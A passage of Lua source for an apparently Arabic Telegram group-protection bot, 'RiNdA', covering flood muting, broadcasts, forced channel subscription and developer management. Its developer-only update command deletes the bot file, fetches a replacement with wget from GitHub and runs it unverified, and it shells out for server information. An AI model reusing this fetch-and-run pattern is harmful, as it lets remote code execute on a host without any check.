if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
end 
if type == 'keed' then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '\n ⊀︰ العضــو > '..Name..'\n ⊀︰ قام بالتكرار هنا وتم تقييده '  
sendText(msg.chat_id_,Text,0,'md')
return false  
end  
if type == 'mute' then
Text = '\n ⊀︰ العضــو > '..Name..'\n ⊀︰ قام بالتكرار هنا وتم كتمه '  
sendText(msg.chat_id_,Text,0,'md')
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end
end,nil)   
end  
function plugin_RiNdA(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.RiNdA and msg then
pre_msg = plugin.RiNdA(msg)
end
end
end
send(msg.chat_id_, msg.id_,pre_msg)  
end
--------------------------------------------------------------------------------------------------------------
function SourceRiNdA(msg,data) -- بداية العمل
if msg then
local text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
database:incr(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
database:sadd(bot_id..'User_Bot',msg.sender_user_id_)  
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
end
if database:get(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ⊀︰ ." then   
send(msg.chat_id_, msg.id_,"تـم الغاء الاذاعـه بـرو..🕸️")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
database:set(bot_id..'Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_," ⊀︰ تـم الاذاعـه بـرو..🕸️ "..#list.." ~* كـروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'UserBot' then
if text == '/start' then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if Devmode(msg) then
local bl = ' ⊀︰ اهلا عزيزي آلمـطـور\n ⊀︰ آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n ⊀︰ تسـتطـيع‌‏ آلتحگم باوامر البوت\n ⊀︰ من خلاال الكيبورد خاص بك\n ⊀︰ قناة سورس البوت [اضغط هنا](t.me/SourcE_RiNdA)'
local keyboard = {
{'الاحصائيات ⊀︰ .'},
{'تعطيل التواصل ⊀︰ .','تفعيل التواصل ⊀︰ .'},
{'ضع اسم للبوت ⊀︰ .','قائمه العام ⊀︰ .','قائمه الكتم العام ⊀︰ .'},
{'⊀︰ . تحديثات سورس ريندا ⊀︰ .'},
{'المطورين ⊀︰ .','الثانويين ⊀︰ .'},
{'المشتركين ⊀︰ .','الكروبات ⊀︰ .'},
{'تغير رساله الاشتراك','حذف رساله الاشتراك ⊀︰ .','تغير الاشتراك'},
{'ضع كليشه ستارت ⊀︰ .','حذف كليشه ستارت ⊀︰ .'},
{'اذاعه ⊀︰ .','اذاعه خاص ⊀︰ .','اذاعه بالتثبيت ⊀︰ .'},
{'اذاعه بالتوجيه ⊀︰ .','اذاعه بالتوجيه خاص ⊀︰ .'},
{'تفعيل الاشتراك الاجباري ⊀︰ .','تعطيل الاشتراك الاجباري ⊀︰ .'},
{'الاشتراك الاجباري ⊀︰ .','خلي قناة الاشتراك ⊀︰ .'},
{'تفعيل البوت الخدمي ⊀︰ .','تعطيل البوت الخدمي ⊀︰ .'},
{'تنظيف الكروبات ⊀︰ .','تنظيف المشتركين ⊀︰ .'},
{'ارفع نسخه للبوت⊀︰ .'},
{'تحديث ريندا ⊀︰ .','تحديث ⊀︰ .'},
{'معلومات السيرفر ⊀︰ .'},
{'الغاء ⊀︰ .'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
else
if not database:get(bot_id..'Start:Time'..msg.sender_user_id_) then
local start = database:get(bot_id.."Start:Bot")  
if start then 
SourceRiNdAr = start
else
SourceRiNdAr = ' ⊀︰ اهلا عزيزي\n ⊀︰ انا بوت اسمي ' ..Namebot..'\n ⊀︰ اختصاصي حمايه الكروبات\n ⊀︰ من تكرار والسبام والتوجيه والخ…\n ⊀︰ لتفعيلي اتبع الـضلـ؏  طوات…↓\n ⊀︰ اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع >{ منشئ او المشرفين } بتفعيل فقط\n[ ⊀︰ معرف المطور ['..UserName..']'
end 
send(msg.chat_id_, msg.id_, SourceRiNdAr) 
end
end
database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
return false
end
if not Devmode(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
send(msg.sender_user_id_, msg.id_,' ⊀︰ تم ارسال رسالتك\n ⊀︰ بـس اشـوف ࢪسالتك ارد')
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = ' ⊀︰ تم ارسال الملصق من ↓\n - '..Name
sendText(SUDO,Text,0,'md')
end 
end,nil) 
end,nil)
end
if Devmode(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⊀︰ المستخدم > '..Name..'\n ⊀︰ تم حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 
if text =='الغاء الحظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⊀︰ المستخدم > '..Name..'\n ⊀︰ تم الغاء حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:srem(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 

tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
local RiNdA_Msg = '\n ⊀︰ قام الشخص بحظر البوت'
send(msg.chat_id_, msg.id_,RiNdA_Msg) 
return false  
end 
if text then    
send(id_user,msg.id_,text)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⊀︰ المستخدم > '..Name..'\n ⊀︰ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end    
if msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⊀︰ المستخدم > '..Name..'\n ⊀︰ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end      
if msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1, nil,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⊀︰ المستخدم > '..Name..'\n ⊀︰ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⊀︰ المستخدم > '..Name..'\n ⊀︰ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ⊀︰ المستخدم > '..Name..'\n ⊀︰ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
end,nil)
end,nil)
end,nil)
end,nil)
end 
if text == 'تفعيل التواصل ⊀︰ .' and Devmode(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n ⊀︰ تم تفعيل التواصل ' 
else
Text = '\n ⊀︰ بالتاكيد تم تفعيل التواصل '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل ⊀︰ .' and Devmode(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n ⊀︰ تم تعطيل التواصل' 
else
Text = '\n ⊀︰ بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي ⊀︰ .' and Devmode(msg) then  
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n ⊀︰ تم تفعيل البوت الخدمي ' 
else
Text = '\n ⊀︰ بالتاكيد تم تفعيل البوت الخدمي '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي ⊀︰ .' and Devmode(msg) then  
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n ⊀︰ تم تعطيل البوت الخدمي' 
else
Text = '\n ⊀︰ بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'الغاء' or text == 'الغاء ⊀︰ .' then   
send(msg.chat_id_, msg.id_,' ⊀︰ الغاء حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,' ⊀︰ تم حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
if text == 'ضع كليشه ستارت ⊀︰ .' and Devmode(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ⊀︰ ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه ستارت ⊀︰ .' and Devmode(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ⊀︰ تم حذف كليشه ستارت')
end
if text == 'معلومات السيرفر ⊀︰ .' and Devmode(msg) then 
send(msg.chat_id_, msg.id_, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '⇗ نظام التشغيل ⇖⊀︰ \n*>> '"$linux_version"'*' 
echo '*———————————~*\n⊀︰ .{ الذاكره العشوائيه } ⇎\n*>> '"$memUsedPrc"'*'
echo '*———————————~*\n⊀︰ .{ وحـده الـتـخـزيـن } ⇎\n*>> '"$HardDisk"'*'
echo '*———————————~*\n⊀︰ .{ الـمــعــالــج } ⇎\n*>> '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
echo '*———————————~*\n⊀︰ .{ الــدخــول } ⇎\n*>> '`whoami`'*'
echo '*———————————~*\n⊀︰ .{ مـده تـشغيـل الـسـيـرفـر }⇎\n*>> '"$uptime"'*'
]]):read('*all'))  
end

if text == 'تحديث ريندا ⊀︰ .' and Devmode(msg) then 
os.execute('rm -rf RiNdA.lua')
os.execute('wget https://raw.githubusercontent.com/RiNdA-SourcE/RiNdA/main/RiNdA.lua')
send(msg.chat_id_, msg.id_,' ⊀︰ تم تحديث سوࢪس ࢪيندا \n ⊀︰ لديك اخر اصدار لسورس ريندا\n ⊀︰ تحديث > { Version> 1 }')
dofile('RiNdA.lua')  
end
if text == 'تحديث ⊀︰ .' and Devmode(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ⊀︰ اصدار سورس ريندا \n ⊀︰ تحديث >{ Version> 1 }')
end
if text == "ضع اسم للبوت ⊀︰ ." and Devmode(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ⊀︰ ارسل اليه الاسم الان ")
return false
end
if text == 'الاحصائيات ⊀︰ .' and Devmode(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' الاحصائيات ⊀︰ . \n'..' ⊀︰ عدد الكروبات > {'..Groups..'}'..'\n ⊀︰ عدد المشتركين > {'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'المشتركين ⊀︰ .' and Devmode(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ⊀︰ المشتركين>{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == 'الكروبات ⊀︰ .' and Devmode(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ⊀︰ الكروبات>{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == ("المطورين ⊀︰ .") and Devmode(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n ⊀︰ قائمة المطورين \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد مطورين*"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("الثانويين ⊀︰ .") and Devmode(msg) then
local list = database:smembers(bot_id..'Dev:mode:2')
t = "\n ⊀︰ قائمة الثانويين \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد ثانويين*"
end
send(msg.chat_id_, msg.id_, t)
end
-------------
if text == "⊀︰ . تحديثات سورس ريندا ⊀︰ ." and Devmode(msg) then  
local updatech =[[
*اهلا بک فـي قـنـاتہ سـورس وتحـديثاتہ ريـنـدأآ قـمہ بالاشتراک بالقـناتہ ليصـلک ڪـل جديـد 🍇🍃*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(updatech).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
-----------
if text == ("قائمه العام ⊀︰ .") and Devmode(msg) then
local list = database:smembers(bot_id..'GBan:User')
t = "\n ⊀︰ قائمه المحظورين عام \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("قائمه الكتم العام ⊀︰ .") and Devmode(msg) then
local list = database:smembers(bot_id..'Gmute:User')
t = "\n ⊀︰ قائمة المكتومين عام \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد مكتومين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text=="اذاعه خاص ⊀︰ ." and msg.reply_to_message_id_ == 0 and Devmode(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⊀︰ ارسل الان اذاعتك؟ \n ⊀︰ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه ⊀︰ ." and msg.reply_to_message_id_ == 0 and Devmode(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⊀︰ ارسل الان اذاعتك؟ \n ⊀︰ للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت ⊀︰ ." and msg.reply_to_message_id_ == 0 and Devmode(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⊀︰ ارسل الان اذاعتك؟ \n ⊀︰ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه ⊀︰ ." and msg.reply_to_message_id_ == 0  and Devmode(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⊀︰ ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص ⊀︰ ." and msg.reply_to_message_id_ == 0  and Devmode(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⊀︰ ارسل لي التوجيه الان")
return false
end 
if text == 'ارفع نسخه للبوت⊀︰ .' and Devmode(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ⊀︰ ." and Devmode(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⊀︰  اهلا بك عزيزي ⊀︰ ⊀︰ \n⊀︰  لايمكنك استخدام البوت ⊀︰ ⊀︰ \n⊀︰  عليك الاشتراك في القناة ⊀︰ ⊀︰ \n⊀︰  اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'⊀︰ لا يوجد مشتركين وهميين في البوت \n')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'⊀︰ عدد المشتركين الان > ( '..#pv..' )\n⊀︰ تم ازالة > ( '..sendok..' ) من المشتركين\n⊀︰ الان عدد المشتركين الحقيقي > ( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "تنظيف الكروبات ⊀︰ ." and Devmode(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⊀︰  اهلا بك عزيزي ⊀︰ ⊀︰ \n⊀︰  لايمكنك استخدام البوت ⊀︰ ⊀︰ \n⊀︰  عليك الاشتراك في القناة ⊀︰ ⊀︰ \n⊀︰  اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',group[i])  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=group[i],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'⊀︰ لا يوجد كروبات وهميه في البوت\n')   
else
local RiNdA = (w + q)
local sendok = #group - RiNdA
if q == 0 then
RiNdA = ''
else
RiNdA = '\n⊀︰ تم ازالة > { '..q..' } كروبات من البوت'
end
if w == 0 then
RiNdAk = ''
else
RiNdAk = '\n⊀︰ تم ازالة > {'..w..'} كروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'⊀︰ عدد الكروبات الان > { '..#group..' }'..RiNdAk..''..RiNdA..'\n⊀︰ الان عدد الكروبات الحقيقي > { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
return false
end


if text and text:match("^ارفع مطور @(.*)$") and Devmode(msg) then
local username = text:match("^ارفع مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم رفـعه مطـوࢪ*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^ارفع مطور (%d+)$") and Devmode(msg) then
local userid = text:match("^ارفع مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ مطور*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تمَ رفعَهہ↫ مطور*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text and text:match("^نزل مطور @(.*)$") and Devmode(msg) then
local username = text:match("^نزل مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Sudo:User', result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المطورين*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^نزل مطور (%d+)$") and Devmode(msg) then
local userid = text:match("^نزل مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المطورين*'
